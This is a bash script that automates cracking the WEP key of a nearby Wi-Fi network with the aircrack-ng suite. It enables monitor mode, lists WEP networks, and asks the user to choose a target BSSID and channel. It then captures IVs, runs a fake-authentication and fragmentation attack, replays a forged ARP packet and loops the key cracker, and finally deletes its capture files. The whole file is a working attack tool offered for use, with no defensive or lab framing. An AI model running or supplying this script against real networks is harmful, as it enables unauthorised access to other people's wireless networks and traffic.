#!/bin/bash
# wepcrack.sh
#
# This tool requires aircrack-ng tools to be installed and run as root
#


#################################################################
# CHECKING FOR ROOT
#################################################################
if [ `echo -n $USER` != "root" ]
then
	echo "MESSAGE:"
	echo "MESSAGE: ERROR: Please run as root!"
	echo "MESSAGE:"
	exit 1
fi

#################################################################
# CHECKING TO SEE IF INTERFACE IS PROVIDED
#################################################################
if [ -z ${1} ]
then
	echo "MESSAGE: Version number ${VERSION}"
	echo "MESSAGE: Usage: `basename ${0}` [interface] [BSSID] [channel]"
	echo "MESSAGE: Example #`basename ${0}` wlan0 (everything else is optional)"
	exit 1
else
	INTERFACE="`echo "${1}" | cut -c 1-6`"
	echo "MESSAGE: Putting ${INTERFACE} in monitor mode"
fi

#################################################################
# PUT WIFI IN MONITOR MODE
#################################################################
airmon-ng start ${INTERFACE}
iwconfig ${INTERFACE} # mon0

#################################################################
# GET INTERFACE MAC ADDRESS
#################################################################
MACADDRESS=`ifconfig ${INTERFACE} | grep ${INTERFACE} | tr -s ' ' | cut -d ' ' -f5 | cut -c 1-17`

#################################################################
# CHECK IF BSSID,CHANNEL & TARGETNAME WERE PROVIDED
#################################################################
if [ -z ${2} ] || [ -z ${3} ] ; then
	#################################################################
	# SHOW VISIBLE WEP NETWORKS
	#################################################################
	echo "MESSAGE: Will now display all visible WEP networks"
	echo "MESSAGE: Once you have identified the network you wish to target press Ctrl-C to exit"
	read -p "MESSAGE: Press enter to view networks"
	airodump-ng --encrypt WEP ${INTERFACE} # mon0

	#################################################################
	# USER INPUT DETAILS FROM AIRODUMP
	#################################################################
	while true
	do
		echo -n "MESSAGE: Please enter the target BSSID here: "
		read -e BSSID
		echo -n "MESSAGE: Please enter the target channel here: "
		read -e CHANNEL
		echo "MESSAGE: Target BSSID            : ${BSSID}"
		echo "MESSAGE: Target Channel          : ${CHANNEL}"
		echo "MESSAGE: Interface MAC Address   : ${MACADDRESS}"
		echo -n "MESSAGE: Is this information correct? (y or n): "
	  	read -e CONFIRM
	 	case $CONFIRM in
	    		y|Y|YES|yes|Yes)
				break ;;
	    		*) echo "MESSAGE: Please re-enter information"
	  	esac
	done
fi

#################################################################
# START AIRODUMP IN XTERM WINDOW
#################################################################
echo "MESSAGE: Starting packet capture - Ctrl-c to end it"
xterm -e "airodump-ng -c ${CHANNEL} --bssid ${BSSID} --ivs -w capture ${INTERFACE}" & AIRODUMPPID=$!
sleep 2

#################################################################
# ASSOCIATE WITH AP & THEN PERFORM FRAGMENTATION ATTACK
#################################################################
aireplay-ng -1 0 -a ${BSSID} -h ${MACADDRESS} ${INTERFACE}
aireplay-ng -5 -b ${BSSID} -h ${MACADDRESS} ${INTERFACE}
packetforge-ng -0 -a ${BSSID} -h ${MACADDRESS} -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w arp-packet ${INTERFACE}
xterm -e "aireplay-ng -2 -r arp-packet ${INTERFACE}" & AIREPLAYPID=$!

#################################################################
# ATTEMPTING TO CRACK
#################################################################
while true
do
	aircrack-ng -n 128 -b ${BSSID} *.ivs
	echo -n "MESSAGE: Did you get the key?: (y or no)"
  	read -e CONFIRM
 	case $CONFIRM in
    		y|Y|YES|yes|Yes)
			break ;;
    		*) echo "MESSAGE: Will attempt to crack again" & sleep 3
  	esac
done

#################################################################
# DELETE FILES CREATED DURING WEP CRACKING
#################################################################
kill ${AIRODUMPPID}
kill ${AIREPLAYPID}
airmon-ng stop ${INTERFACE}
rm *.ivs *.cap *.xor
exit 0